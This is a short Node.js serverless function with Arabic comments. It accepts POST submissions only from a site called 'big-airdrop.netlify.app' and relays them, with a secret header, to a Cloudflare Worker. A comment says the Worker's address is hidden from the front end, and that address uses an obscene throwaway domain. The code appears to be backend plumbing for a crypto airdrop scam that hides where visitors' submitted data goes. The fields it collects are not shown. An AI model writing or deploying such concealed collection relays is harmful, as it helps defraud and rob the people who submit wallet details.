// api/submit.js
// ---------------------------------------------
// ⛳️ رابط الـWorker (مخفي عن الواجهة)
const WORKER_URL = "https://1fuckurmotherhahahahahahaha.eth2-stiffness640.workers.dev/";

// 🔒 السماح فقط لموقعك الحقيقي
const ALLOWED_ORIGINS = [
  "https://big-airdrop.netlify.app"
];

// 🔑 السرّ السري بين Vercel ↔ Worker (يتم ضبطه في Vercel Dashboard → Environment Variables)
const RELAY_SECRET = process.env.RELAY_SECRET || "";

// دالة لاستخراج Origin من Referer (لو المتصفح ما أرسل origin)
function originFromReferer(referer = "") {
  try {
    if (!referer) return "";
    const u = new URL(referer);
    return `${u.protocol}//${u.host}`;
  } catch {
    return "";
  }
}

export default async function handler(req, res) {
  const reqOrigin = req.headers.origin || "";
  const referer = req.headers.referer || "";
  const origin = reqOrigin || originFromReferer(referer);

  // --- OPTIONS (preflight) ---
  if (req.method === "OPTIONS") {
    if (!origin || !ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: "Forbidden origin (preflight)", got: origin || null });
    }
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    res.setHeader("Vary", "Origin");
    return res.status(200).send("ok");
  }

  // --- رفض غير POST ---
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  // --- فحص الأصل ---
  if (!origin || !ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin || "*");
    res.setHeader("Vary", "Origin");
    return res.status(403).json({ error: "Forbidden origin", got: origin || null });
  }

  try {
    // --- تمرير الطلب للـWorker + إضافة X-Relay-Secret ---
    const response = await fetch(WORKER_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Origin": origin,
        "X-Relay-Secret": RELAY_SECRET   // 👈 هذه الإضافة المهمة
      },
      body: JSON.stringify(req.body)
    });

    const raw = await response.text();
    let payload;
    try {
      payload = JSON.parse(raw);
    } catch {
      payload = { raw };
    }

    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Vary", "Origin");

    return res.status(response.status).json(payload);
  } catch (err) {
    res.setHeader("Access-Control-Allow-Origin", origin || "*");
    res.setHeader("Vary", "Origin");
    return res.status(500).json({
      error: "Failed forwarding request",
      details: err?.message || "unknown"
    });
  }
}
